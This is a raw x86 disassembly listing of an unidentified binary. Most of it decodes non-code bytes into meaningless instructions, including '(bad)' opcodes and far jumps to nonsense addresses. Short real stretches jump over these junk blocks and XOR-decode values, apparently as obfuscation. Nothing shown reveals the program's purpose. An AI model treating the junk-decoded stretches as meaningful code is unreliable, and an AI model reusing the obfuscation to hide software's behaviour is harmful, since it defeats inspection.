  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
  40306d:	jge    0x402ffc
  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	(bad)  
  403076:	jmp    eax
  403078:	out    0x9e,al
  40307a:	sbb    bh,BYTE PTR [esi+0x7e]
  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	push   ecx
  403082:	xor    eax,0xcf5e617a
  403087:	imul   DWORD PTR [edx+0x29]
  40308a:	adc    edi,DWORD PTR [edi+0xd]
  40308d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40308e:	mov    bl,0xb3
  403090:	je     0x4030a4
  403092:	mov    al,ds:0x84c3dbd5
  403097:	js     0x403107
  403099:	(bad)
  40309e:	cld    
  40309f:	pop    es
  4030a0:	sub    BYTE PTR [ebp+edx*2-0x47c9a9df],0xa1
  4030a8:	mov    dl,0x79
  4030aa:	sti    
  4030ab:	fsubr  st,st(6)
  4030ad:	lock or edx,DWORD PTR [ebp-0x28]
  4030b1:	addr16 mov al,0x16
  4030b4:	stos   DWORD PTR es:[edi],eax
  4030b5:	mov    eax,0x1f81774
  4030ba:	xchg   esi,eax
  4030bb:	adc    DWORD PTR ds:[esi+0x20],0xfffffff2
  4030c0:	ins    BYTE PTR es:[edi],dx
  4030c1:	mov    esp,DWORD PTR [ebp+0x650f5323]
  4030c7:	pop    edx
  4030c8:	add    DWORD PTR [esp+ebp*4+0x571cc954],0xffffffe3
  4030d0:	aam    0x5d
  4030d2:	push   ss
  4030d3:	in     al,dx
  4030d4:	daa    
  4030d5:	into   
  4030d6:	dec    esp
  4030d7:	mov    dh,bh
  4030d9:	inc    eax
  4030da:	mov    ss,esi
  4030dc:	sbb    BYTE PTR [esi+eax*2+0x5caa1f95],al
  4030e3:	popa   
  4030e4:	scas   eax,DWORD PTR es:[edi]
  4030e5:	mov    ecx,0x2a3869d5
  4030ea:	dec    edx
  4030eb:	dec    esp
  4030ec:	push   ebp
  4030ed:	pop    ebp
  4030ee:	mov    dh,0xb
  4030f0:	icebp  
  4030f1:	imul   ecx,DWORD PTR [eax-0x79],0x7a
  4030f5:	push   ebx
  4030f6:	xchg   edx,eax
  4030f7:	inc    ebp
  4030f8:	scas   al,BYTE PTR es:[edi]
  4030f9:	adc    al,0xc9
  4030fb:	xor    DWORD PTR [esi-0x30],ebx
  4030fe:	sbb    dh,al
  403100:	jp     0x4030d6
  403102:	mul    DWORD PTR [ecx+edi*4-0x10]
  403106:	pop    esp
  403107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403108:	sbb    al,0x26
  40310a:	sbb    eax,0xd93c2aee
  40310f:	xchg   esi,eax
  403110:	fdiv   QWORD PTR [edi]
  403112:	push   ebp
  403113:	sub    al,0x69
  403115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403116:	and    ah,BYTE PTR [edi-0x16]
  403119:	jnp    0x4030e6
  40311b:	data16 adc BYTE PTR [eax-0x75],0x6d
  403120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403121:	xchg   BYTE PTR [edi],dh
  403123:	jle    0x40319a
  403125:	push   ebx
  403126:	sbb    al,0x77
  403128:	repnz test al,0xb6
  40312b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40312c:	xchg   esp,eax
  40312d:	fidiv  WORD PTR [edi+0x72]
  403130:	xchg   DWORD PTR [ecx+0x45],edx
  403133:	mov    edi,0xfc9f64ad
  403138:	dec    ebp
  403139:	cmp    bh,ch
  40313b:	and    eax,0xdb61a1e4
  403140:	pop    edi
  403141:	addr16 jle 0x40317f
  403144:	shl    ebx,0x9d
  403147:	jle    0x403158
  403149:	in     al,dx
  40314a:	sahf   
  40314b:	pop    esp
  40314c:	sub    al,0x60
  40314e:	int    0x6e
  403150:	and    BYTE PTR [ebx],bl
  403152:	xchg   edi,eax
  403153:	inc    esi
  403154:	push   esp
  403155:	xchg   DWORD PTR gs:[ebp+0x1620e70c],esi
  40315c:	mov    edi,0xdfb1cbde
  403161:	add    ah,BYTE PTR [eax+0x1c]
  403164:	or     eax,0xa845ef86
  403169:	xor    dh,ah
  40316b:	clc    
  40316c:	xchg   ebx,eax
  40316d:	push   ebx
  40316e:	push   esi
  40316f:	ss retf 
  403171:	les    edx,FWORD PTR ds:0xfdb2d74e
  403177:	ror    DWORD PTR [ebx],1
  403179:	pop    esp
  40317a:	(bad)  
  40317b:	adc    al,0x9c
  40317d:	ficom  DWORD PTR [ebp-0x6709dcc6]
  403183:	add    DWORD PTR ds:0x73ef92e4,esi
  403189:	mov    ebx,0x8beed661
  40318e:	add    eax,0x624c2e48
  403193:	add    dh,dl
  403195:	rcr    BYTE PTR [edi],0x9b
  403198:	ds push edx
  40319a:	mov    cl,0x5e
  40319c:	sbb    bh,bh
  40319e:	push   ecx
  40319f:	jle    0x40314d
  4031a1:	inc    edi
  4031a2:	loop   0x40317f
  4031a4:	sahf   
  4031a5:	or     DWORD PTR [ebx-0x2a9aa271],0xffffffa5
  4031ac:	sub    BYTE PTR [edx],0xe6
  4031af:	dec    edx
  4031b0:	jmp    0x3372:0x62a92dfc
  4031b7:	mov    cl,0x9f
  4031b9:	cmp    al,0x56
  4031bb:	fwait
  4031bc:	jb     0x403225
  4031be:	sub    eax,0x4a9e4155
  4031c3:	jg     0x403147
  4031c5:	mov    WORD PTR [esi+eiz*4-0x5c],es
  4031c9:	mov    bh,BYTE PTR [esi+0x4cb56318]
  4031cf:	cmp    DWORD PTR [eax-0x91cd96f],edx
  4031d5:	lods   al,BYTE PTR ds:[esi]
  4031d6:	mov    bl,0x51
  4031d8:	pop    es
  4031d9:	cmp    BYTE PTR [edi+0x1c3a0e7],cl
  4031df:	mov    al,ds:0xd7c2487f
  4031e4:	lds    eax,FWORD PTR [edi]
  4031e6:	push   esi
  4031e7:	xor    eax,0x886dbc86
  4031ec:	ja     0x4031a5
  4031ee:	mov    eax,ds:0x937359fc
  4031f3:	lods   eax,DWORD PTR ds:[esi]
  4031f4:	xor    ah,al
  4031f6:	out    0x6,eax
  4031f8:	pop    es
  4031f9:	fldln2 
  4031fb:	sub    ebp,0x7df1732c
  403201:	div    DWORD PTR [ebx]
  403203:	nop
  403204:	mov    esp,0xed63bddf
  403209:	std    
  40320a:	cmp    ebx,DWORD PTR [ebp-0x7]
  40320d:	or     al,0xbe
  40320f:	fist   DWORD PTR [ebp+ebx*1-0x7e]
  403213:	scas   eax,DWORD PTR es:[edi]
  403214:	retf   0x1ea1
  403217:	test   al,0x12
  403219:	retf   0xee5
  40321c:	inc    ebx
  40321d:	pop    ebp
  40321e:	mov    ebp,0x1f616858
  403223:	xchg   ebp,eax
  403224:	mov    ecx,0xc197bf50
  403229:	sub    BYTE PTR [ecx-0x6f44a2cb],dl
  40322f:	inc    ecx
  403230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403231:	dec    edx
  403232:	jl     0x40327e
  403234:	mov    ch,0xe7
  403236:	enter  0xc919,0x5d
  40323a:	cli    
  40323b:	ror    DWORD PTR [eax],0xf2
  40323e:	jnp    0x40328a
  403240:	lods   eax,DWORD PTR ds:[esi]
  403241:	and    BYTE PTR [ecx+0x34],bh
  403244:	push   ecx
  403245:	xchg   ebp,eax
  403246:	(bad)  
  403247:	sti    
  403248:	xchg   DWORD PTR ds:0x119e6aa4,edi
  40324e:	push   0x5a
  403250:	jg     0x4032ae
  403252:	(bad)  
  403253:	pusha  
  403254:	push   ebp
  403255:	neg    DWORD PTR [ebx-0x1fdca400]
  40325b:	mov    edi,0x1769b412
  403260:	jns    0x40328a
  403262:	mov    edx,0x368a970e
  403267:	pop    ds
  403268:	xor    esi,DWORD PTR [esi-0x28]
  40326b:	pushf  
  40326c:	xchg   edi,eax
  40326d:	add    DWORD PTR [ecx+0x14],0x909b9a56
  403274:	scas   eax,DWORD PTR es:[edi]
  403275:	xor    ch,ah
  403277:	cdq    
  403278:	add    al,0xf5
  40327a:	loopne 0x403240
  40327c:	cwde   
  40327d:	icebp  
  40327e:	stos   BYTE PTR es:[edi],al
  40327f:	mov    dh,0xb4
  403281:	jp     0x403227
  403283:	(bad)  
  403284:	(bad)  
  403285:	pop    ds
  403286:	aam    0x7c
  403288:	out    0xfa,eax
  40328a:	push   0xd7c250fb
  40328f:	nop
  403290:	icebp  
  403291:	mov    eax,ds:0x21dd69c2
  403296:	dec    esp
  403297:	lahf   
  403298:	xor    al,0x18
  40329a:	cwde   
  40329b:	pop    ecx
  40329c:	test   DWORD PTR [ebp+0x788c195d],eax
  4032a2:	js     0x403254
  4032a4:	mov    ds:0xdd056f87,eax
  4032a9:	and    al,0xf3
  4032ab:	shr    BYTE PTR [esp+ebx*4+0x2b],cl
  4032af:	jge    0x4032db
  4032b1:	stc    
  4032b2:	inc    ebx
  4032b3:	jbe    0x4032fa
  4032b5:	xchg   edi,eax
  4032b6:	xor    DWORD PTR ds:0xe890477a,edx
  4032bc:	jb     0x4032bb
  4032be:	sbb    BYTE PTR [edx+0x3f],ah
  4032c1:	dec    edx
  4032c2:	xchg   ebx,eax
  4032c3:	(bad)  
  4032c5:	inc    edi
  4032c6:	fisub  WORD PTR [ebp-0x4e232504]
  4032cc:	sub    BYTE PTR [ecx+edi*2],bl
  4032cf:	cmp    eax,0x584240ff
  4032d4:	(bad)  
  4032d5:	mov    ds:0xe0fb69e7,al
  4032da:	inc    edi
  4032db:	push   esi
  4032dc:	call   0xa3bdd98f
  4032e1:	ins    BYTE PTR es:[edi],dx
  4032e2:	repnz and BYTE PTR [edx+0x5cc98299],ch
  4032e9:	xor    BYTE PTR [edx+eax*1+0x68],dl
  4032ed:	xor    eax,0x96781b09
  4032f2:	xchg   ebp,eax
  4032f3:	xor    DWORD PTR [ebp-0x3554886e],esi
  4032f9:	sbb    al,0x68
  4032fb:	xor    esp,DWORD PTR [edx+0x33]
  4032fe:	or     esp,DWORD PTR [edi+0x2b1a8ece]
  403304:	mov    eax,0x2e5c1914
  403309:	retf   0xaac0
  40330c:	sbb    BYTE PTR [eax-0x1105040c],dl
  403312:	clc    
  403313:	rcl    BYTE PTR [edi+0x797f9186],cl
  403319:	cmp    bl,BYTE PTR [ebp-0x2e41d414]
  40331f:	push   eax
  403320:	and    edi,ebp
  403322:	cmc    
  403323:	xchg   esp,eax
  403324:	sahf   
  403325:	mov    ds:0x6711a62e,al
  40332a:	(bad)  
  40332b:	mov    esp,0x153d1aa1
  403330:	add    ebx,edi
  403332:	jb     0x40330b
  403334:	fcomi  st,st(0)
  403336:	inc    ebp
  403337:	sbb    eax,DWORD PTR [esi]
  403339:	adc    bl,BYTE PTR [edx]
  40333b:	dec    ecx
  40333c:	mov    edx,DWORD PTR [ebp+0x57f93dd4]
  403342:	rol    BYTE PTR [ebx-0x28d12501],0x8a
  403349:	jns    0x403337
  40334b:	mov    edi,0x9398474e
  403350:	sbb    ebx,eax
  403352:	mov    edx,0xfa98242f
  403357:	jl     0x403362
  403359:	sbb    eax,0xb74adab
  40335e:	mov    BYTE PTR [eax+0x3f9893f8],dl
  403364:	sti    
  403365:	xor    ch,cl
  403367:	sbb    ch,BYTE PTR [esi-0x77]
  40336a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40336b:	sub    dl,BYTE PTR [ecx]
  40336d:	xor    al,0x83
  40336f:	adc    esp,DWORD PTR [ecx]
  403371:	push   0x43
  403373:	push   0x1c
  403375:	inc    ebx
  403376:	fist   DWORD PTR [ebx-0x14d99414]
  40337c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40337d:	mov    DWORD PTR [ebx],eax
  40337f:	mov    ecx,0xb0ef7d95
  403384:	cmp    BYTE PTR [edi-0x17],dl
  403387:	sti    
  403388:	pop    eax
  403389:	lea    ecx,[eax+eax*4+0x732022a5]
  403390:	scas   eax,DWORD PTR es:[edi]
  403391:	sbb    al,0xb9
  403393:	dec    ebp
  403394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403395:	mov    ds:0x8b2d8f62,al
  40339a:	cwde   
  40339b:	pop    edx
  40339c:	xchg   ebp,eax
  40339d:	aad    0x71
  40339f:	sar    DWORD PTR [edx+0x69697a5],0xd2
  4033a6:	cmp    al,0x3d
  4033a8:	xchg   ebx,eax
  4033a9:	xchg   ebp,eax
  4033aa:	mov    esp,0xf390e813
  4033af:	mov    bh,0x25
  4033b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033b2:	shr    DWORD PTR [eax+0x58c5f575],1
  4033b8:	gs pop edi
  4033ba:	jmp    0x4033ce
  4033bc:	adc    ah,ah
  4033be:	lea    eax,[ecx]
  4033c0:	movhlps xmm6,xmm7
  4033c3:	in     al,0x73
  4033c5:	xor    BYTE PTR ds:0x8d62,bh
  4033ca:	mov    dh,0x87
  4033cc:	test   BYTE PTR [edi],dh
  4033ce:	iret   
  4033cf:	sbb    eax,0x2c4ead28
  4033d4:	ins    DWORD PTR es:[edi],dx
  4033d5:	dec    eax
  4033d6:	mov    edx,0xbbbad582
  4033db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033dc:	js     0x4033d8
  4033de:	adc    al,0x20
  4033e0:	mov    dh,0x3c
  4033e2:	imul   edi,DWORD PTR [edx],0xffffffb5
  4033e5:	cld    
  4033e6:	aas    
  4033e7:	add    ebx,DWORD PTR [edi+0x260d38bd]
  4033ed:	out    0xe1,eax
  4033ef:	int    0x1b
  4033f1:	icebp  
  4033f2:	cmp    DWORD PTR [ebx],edi
  4033f4:	xchg   esi,esi
  4033f6:	data16 mov BYTE PTR [esi],bl
  4033f9:	inc    ebp
  4033fa:	mov    edi,0x7ff2a6ce
  4033ff:	inc    ebx
  403400:	cmp    al,0x78
  403402:	pop    eax
  403403:	fdivr  DWORD PTR [ebx]
  403405:	nop
  403406:	ins    BYTE PTR es:[edi],dx
  403407:	or     dh,BYTE PTR [ecx-0x54]
  40340a:	jl     0x40346b
  40340c:	aas    
  40340d:	rcl    dh,1
  40340f:	lahf   
  403410:	xor    edx,DWORD PTR [edx+0x16]
  403413:	dec    ebx
  403414:	pusha  
  403415:	mov    edi,DWORD PTR [ebp+0x8]
  403418:	mov    edi,DWORD PTR [edi]
  40341a:	mov    edx,0x8a40
  40341f:	xor    ax,dx
  403422:	jmp    0x4037d3
  403427:	nop
  403428:	cdq    
  403429:	fst    QWORD PTR [ecx-0x6683aa03]
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	loopne 0x4034a0
  403435:	fst    st(5)
  403437:	and    bl,BYTE PTR [esi]
  403439:	jle    0x4034b9
  40343b:	xor    BYTE PTR [ecx+0x7e],0x7e
  40343f:	(bad)  
  403440:	cwde   
  403441:	das    
  403442:	push   edi
  403443:	les    esi,FWORD PTR es:[esi-0x385d1322]
  40344a:	sub    DWORD PTR [eax-0x35],ecx
  40344d:	cmp    al,0xa0
  40344f:	mov    ds:0xd1097316,eax
  403454:	and    dh,BYTE PTR [ebp+eax*2-0x341e7c04]
  40345b:	call   0x57f5:0x5784ce6f
  403462:	inc    esp
  403463:	retf   0x8ab5
  403466:	and    dl,BYTE PTR [ebx]
  403468:	arpl   WORD PTR [edi+edx*2-0x520dbdc7],di
  40346f:	and    ah,BYTE PTR [ecx-0x3]
  403472:	jl     0x40349a
  403474:	out    dx,al
  403475:	mov    BYTE PTR [edx+0x3],al
  403478:	ffreep st(7)
  40347a:	and    DWORD PTR [ecx+0xe3fcaf9],eax
  403480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403482:	out    0x5a,eax
  403484:	push   edi
  403485:	cmc    
  403486:	aas    
  403487:	fst    DWORD PTR [ebx]
  403489:	shr    DWORD PTR [ecx+0x29],cl
  40348c:	lea    ecx,[eax+0x3b9b76b9]
  403492:	mov    edi,edx
  403494:	stos   BYTE PTR es:[edi],al
  403495:	popa   
  403496:	mov    ecx,0xc6afa3fd
  40349b:	cs (bad) 
  40349d:	into   
  40349e:	jmp    0xa303:0x76648c93
  4034a5:	jmp    0x46998b8
  4034aa:	repz and ecx,eax
  4034ad:	jp     0x4034cc
  4034af:	and    ax,0xa83b
  4034b3:	jnp    0x40344b
  4034b5:	or     bh,BYTE PTR [eax]
  4034b7:	(bad)  
  4034b8:	fwait
  4034b9:	in     al,dx
  4034ba:	and    eax,0xbe92216a
  4034bf:	jo     0x403508
  4034c1:	lea    esp,[esi]
  4034c3:	pop    ss
  4034c4:	stos   DWORD PTR es:[edi],eax
  4034c5:	std    
  4034c6:	push   ebp
  4034c7:	daa    
  4034c8:	addr16 clc 
  4034ca:	inc    ebx
  4034cb:	mov    al,0x2c
  4034cd:	pop    ss
  4034ce:	add    BYTE PTR [ebx],0x44
  4034d1:	lods   eax,DWORD PTR ds:[esi]
  4034d2:	stos   DWORD PTR es:[edi],eax
  4034d3:	jg     0x40351e
  4034d5:	hlt    
  4034d6:	jl     0x40346e
  4034d8:	xor    ebx,0xffffff81
  4034db:	push   edi
  4034dc:	dec    eax
  4034dd:	lea    esi,[edx+ecx*8]
  4034e0:	pop    esi
  4034e1:	sub    dl,dl
  4034e3:	jno    0x403546
  4034e5:	out    0x90,eax
  4034e7:	cmp    eax,0x496aad8e
  4034ec:	inc    esi
  4034ed:	popa   
  4034ee:	sahf   
  4034ef:	mul    DWORD PTR [esi+ebp*4-0x3c]
  4034f3:	lahf   
  4034f4:	inc    esp
  4034f5:	fwait
  4034f6:	mov    ebx,0x28bdce33
  4034fb:	pop    esi
  4034fc:	cld    
  4034fd:	inc    ebx
  4034fe:	loope  0x40356b
  403500:	out    dx,eax
  403501:	add    ebx,eax
  403503:	les    ebp,FWORD PTR [edx]
  403505:	adc    dl,BYTE PTR [edi-0x64cfb8d5]
  40350b:	addr16 cdq 
  40350d:	(bad)  
  40350e:	sbb    cl,dl
  403510:	cmc    
  403511:	(bad)  
  403512:	mov    edx,0x90816f3e
  403517:	into   
  403518:	or     DWORD PTR [ebx],eax
  40351a:	push   es
  40351b:	mov    ch,0x43
  40351d:	inc    edx
  40351e:	imul   esi,esp,0xb9c1d44d
  403524:	mov    WORD PTR [edi-0x5a8cea94],cs
  40352a:	mov    edi,cr0
  40352d:	pop    ebp
  40352e:	mov    al,ds:0xdd4d1827
  403533:	popa   
  403534:	js     0x4034ca
  403536:	or     BYTE PTR [edx],dh
  403538:	scas   eax,DWORD PTR es:[edi]
  403539:	idiv   BYTE PTR [eax-0x2f]
  40353c:	or     DWORD PTR [edi-0x79229c6d],esi
  403542:	add    ecx,ebx
  403544:	jne    0x4034f4
  403546:	aad    0xda
  403548:	scas   al,BYTE PTR es:[di]
  40354a:	fld    QWORD PTR [esi-0x7eeb62db]
  403550:	push   edx
  403552:	call   0x1761ff2a
  403557:	sub    esi,DWORD PTR [eax+ecx*4+0x4]
  40355b:	pop    edi
  40355c:	sbb    edx,edx
  40355e:	cmp    ah,ch
  403560:	dec    ebp
  403561:	inc    ecx
  403562:	addr16 sbb cl,dl
  403565:	adc    al,0xb2
  403567:	sub    DWORD PTR [ebx+ebx*2],0x18
  40356b:	call   0x5198:0x7a3009c6
  403572:	and    al,0x64
  403574:	adc    al,0xf6
  403576:	xor    bh,bh
  403578:	adc    DWORD PTR [esp+edi*8-0x346e578c],edx
  40357f:	sar    DWORD PTR [esi+edx*8],0xed
  403583:	adc    DWORD PTR [ebp+0x1d6b2e96],ebx
  403589:	mov    bh,0x6b
  40358b:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40358d:	popf   
  40358e:	jmp    0xdfa5d29
  403593:	test   al,0x63
  403595:	push   ss
  403596:	or     al,0x2b
  403598:	inc    ebx
  403599:	or     al,0x5c
  40359b:	xchg   ebx,eax
  40359c:	lods   eax,DWORD PTR ds:[esi]
  40359d:	xor    DWORD PTR [esi-0x2afe8c48],ebx
  4035a3:	inc    ebp
  4035a4:	cld    
  4035a5:	into   
  4035a6:	jne    0x40352f
  4035a8:	(bad)  
  4035a9:	fld    TBYTE PTR [esi+0x5092d8d2]
  4035af:	mov    ch,0xa5
  4035b1:	outs   dx,DWORD PTR ds:[esi]
  4035b3:	pop    es
  4035b4:	ja     0x4035eb
  4035b6:	jb     0x403576
  4035b8:	sbb    dh,BYTE PTR [ecx+0x392dc630]
  4035be:	fisubr WORD PTR [ebx]
  4035c0:	(bad)  
  4035c1:	call   FWORD PTR [ebx-0x8]
  4035c4:	mov    al,0x1a
  4035c6:	push   cs
  4035c7:	cli    
  4035c8:	sub    eax,0x3e62cca
  4035cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035ce:	out    0x23,eax
  4035d0:	(bad)  [ebx+0x2c37ccd3]
  4035d6:	sub    eax,0x1beeff40
  4035db:	fbstp  TBYTE PTR [edx]
  4035dd:	sahf   
  4035de:	pop    ss
  4035df:	adc    BYTE PTR [ebx+0x1369748],al
  4035e5:	je     0x403651
  4035e7:	push   cs
  4035e8:	pop    es
  4035e9:	mov    ebx,0xa95d2676
  4035ee:	cmp    ecx,DWORD PTR [esi]
  4035f0:	jmp    0x80f5c423
  4035f5:	jb     0x4035a6
  4035f7:	pushf  
  4035f8:	cmc    
  4035f9:	pop    eax
  4035fa:	out    0x70,al
  4035fc:	adc    al,0x19
  4035fe:	imul   ebp,DWORD PTR [eax],0x20
  403601:	(bad)  
  403604:	push   dx
  403606:	mov    al,dh
  403608:	repz push edx
  40360a:	lahf   
  40360b:	in     eax,dx
  40360c:	enter  0x5fb8,0xab
  403610:	outs   dx,DWORD PTR ds:[esi]
  403611:	hlt    
  403612:	push   ss
  403613:	and    DWORD PTR [eax],ebx
  403615:	mov    esi,0xed281194
  40361a:	mov    ecx,0xb7a368f9
  40361f:	jecxz  0x4035db
  403621:	sbb    cl,ch
  403623:	mov    ecx,0x3af6e459
  403628:	mov    ecx,0x6e6eedb4
  40362d:	jg     0x4035ff
  40362f:	lods   eax,DWORD PTR ds:[esi]
  403630:	gs (bad) 
  403633:	sar    BYTE PTR [edi],0x3
  403636:	out    dx,eax
  403637:	in     al,0xbe
  403639:	mul    edx
  40363b:	test   DWORD PTR [ebx+0x2952110d],edx
  403641:	mov    BYTE PTR [eax+edx*4],cl
  403644:	mov    es,WORD PTR [eax+0x46748f73]
  40364a:	mov    eax,ds:0x59a3f84b
  40364f:	jnp    0x4035d1
  403651:	(bad)  
  403652:	daa    
  403653:	inc    ebp
  403654:	ds retf 0xa1b1
  403658:	pop    esp
  403659:	das    
  40365a:	jb     0x4036d1
  40365c:	dec    edx
  40365d:	adc    BYTE PTR [ecx-0x57127523],cl
  403663:	sbb    edi,DWORD PTR [eax]
  403665:	dec    esp
  403666:	xor    BYTE PTR [edx+ebp*2-0x431e55fc],al
  40366d:	and    dl,dl
  40366f:	sub    al,0xba
  403671:	std    
  403672:	dec    esp
  403673:	sub    bl,BYTE PTR [edi+0x26ab8bcc]
  403679:	push   edi
  40367a:	mov    ds:0x6efd6838,eax
  40367f:	jmp    0x4036ba
  403681:	test   BYTE PTR [edi],0x73
  403684:	xchg   esp,eax
  403685:	jbe    0x40369b
  403687:	cwde   
  403688:	mov    dl,0xee
  40368a:	gs scas al,BYTE PTR es:[edi]
  40368c:	sub    edx,DWORD PTR [eax]
  40368e:	xchg   edi,eax
  40368f:	add    ch,cl
  403691:	stc    
  403692:	push   ss
  403693:	cmc    
  403694:	js     0x4036e9
  403696:	jnp    0x40368d
  403698:	pop    esi
  403699:	xor    BYTE PTR [ebx+0x47],cl
  40369c:	mov    ebx,0xc220ba8a
  4036a1:	nop
  4036a2:	sub    eax,0x11314a3a
  4036a7:	imul   esp,DWORD PTR [ebx],0xfffffff0
  4036aa:	pop    esi
  4036ab:	inc    ecx
  4036ac:	adc    dl,0x4c
  4036af:	push   0xffffffa7
  4036b1:	jns    0x4036f4
  4036b3:	dec    ecx
  4036b4:	cli    
  4036b5:	mov    WORD PTR [edi+0x56],?
  4036b8:	dec    esi
  4036b9:	fidivr WORD PTR [eax-0xe]
  4036bc:	sub    ah,dl
  4036be:	pop    edi
  4036bf:	shr    BYTE PTR [ebx],0xf6
  4036c2:	dec    ebp
  4036c3:	stc    
  4036c4:	loope  0x403718
  4036c6:	inc    esp
  4036c7:	in     al,0xa7
  4036c9:	sbb    al,BYTE PTR [edi]
  4036cb:	sahf   
  4036cc:	add    eax,0xe981b720
  4036d1:	sbb    BYTE PTR [edi-0x394f5093],0x2f
  4036d8:	and    al,0xea
  4036da:	mov    eax,0x3626236
  4036df:	neg    BYTE PTR [eax+0x7d0092e4]
  4036e5:	aaa    
  4036e6:	mov    ds:0x7d111fb9,al
  4036eb:	xor    al,0x48
  4036ed:	pop    esp
  4036ee:	or     DWORD PTR [edx-0xb],ebx
  4036f1:	jge    0x40371e
  4036f3:	pop    eax
  4036f4:	xchg   esi,eax
  4036f5:	jmp    0xac78:0xcb32dbf0
  4036fc:	mul    DWORD PTR [ecx+0x3495e35e]
  403702:	add    eax,0x9c3586b9
  403707:	pop    esi
  403708:	jo     0x40372f
  40370a:	neg    ch
  40370c:	lahf   
  40370d:	inc    ebx
  40370e:	dec    edi
  40370f:	aaa    
  403710:	hlt    
  403711:	jecxz  0x403720
  403713:	call   0x6b2b:0xda215e92
  40371a:	mov    esi,DWORD PTR [ecx]
  40371c:	mov    cs,WORD PTR [eax+0x62543f33]
  403722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403723:	pop    ecx
  403724:	mov    bl,0x5a
  403726:	jbe    0x403785
  403728:	rcr    ebx,1
  40372a:	lods   al,BYTE PTR ds:[esi]
  40372b:	jmp    0x4036ea
  40372d:	mov    ss,WORD PTR [edi]
  40372f:	mov    ?,WORD PTR [eax+0x59d491c3]
  403735:	popf   
  403736:	addr16 mov ds:0xf25e,eax
  40373a:	mov    ecx,0xf83d6e1e
  40373f:	pop    ss
  403740:	fisttp QWORD PTR ss:[ebx+esi*2+0x10]
  403745:	int3   
  403746:	sbb    eax,0xa5c62d78
  40374b:	or     eax,0x94b3693a
  403750:	call   0x3539:0xd69a9806
  403757:	mov    bl,0xc1
  403759:	or     DWORD PTR [ecx+0x55],0xffffffc1
  40375d:	pusha  
  40375e:	sbb    dl,bl
  403760:	or     edx,DWORD PTR [edi]
  403762:	or     esp,DWORD PTR [ebp+ebp*4+0x5]
  403766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403767:	fbstp  TBYTE PTR [ebx]
  403769:	jnp    0x403776
  40376b:	rcr    DWORD PTR [eax+ebx*4],cl
  40376e:	ret    0x6b32
  403771:	xchg   ebp,eax
  403772:	js     0x403702
  403774:	ret    
  403775:	sbb    eax,0x66a2e710
  40377a:	gs xchg edx,eax
  40377c:	in     al,0xd7
  40377e:	sbb    al,0xa6
  403780:	mov    ebp,DWORD PTR [eax-0x508ffa9d]
  403786:	fnstenv [ebx]
  403788:	repz (bad) 
  40378a:	stos   BYTE PTR es:[edi],al
  40378b:	ins    BYTE PTR es:[edi],dx
  40378c:	mov    esp,0x247b58bc
  403791:	add    dh,BYTE PTR [ebx-0x54]
  403794:	mov    esi,0x51d601c0
  403799:	xor    ebp,DWORD PTR [esp+ebp*2+0x6b384ba0]
  4037a0:	mov    ecx,0x15ad65b5
  4037a5:	xchg   ecx,eax
  4037a6:	nop
  4037a7:	fidiv  WORD PTR [edx-0x14130b4e]
  4037ad:	outs   dx,DWORD PTR ds:[esi]
  4037ae:	adc    ch,ah
  4037b0:	add    al,0xe5
  4037b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037b3:	loopne 0x4037af
  4037b5:	lods   al,BYTE PTR ds:[esi]
  4037b6:	aaa    
  4037b7:	test   eax,0x557d36b8
  4037bc:	mov    al,ds:0x9dbc0d5e
  4037c1:	pushf  
  4037c2:	std    
  4037c3:	mov    edi,0x4eb23701
  4037c8:	aad    0xa8
  4037ca:	(bad)  
  4037cb:	into   
  4037cc:	test   DWORD PTR [eax-0x70],edi
  4037cf:	popf   
  4037d0:	inc    ebp
  4037d1:	repnz mov ebx,0x3b06ba
  4037d7:	add    BYTE PTR [esi+0x3],ah
  4037da:	ret    0x3b66
  4037dd:	pop    es
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
  4037f1:	mov    di,WORD PTR [ebp-0x2c]
  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
